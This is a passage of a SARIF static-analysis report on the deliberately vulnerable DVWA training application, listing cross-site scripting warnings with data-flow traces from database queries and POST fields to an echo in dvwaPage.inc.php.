            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:20 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:24 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:20 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:24 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4716",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "E92ADFA22895E54D8A5C1B6A0234C9E0"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:17 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:21 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:17 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:21 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:17 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:21 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:17 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:21 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:12 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:17 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:21 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4723",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "EA5E5A7DF307FCDB9FD40444CC9F0CD7"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Assignment to $pass_new"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Assignment to $pass_new"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
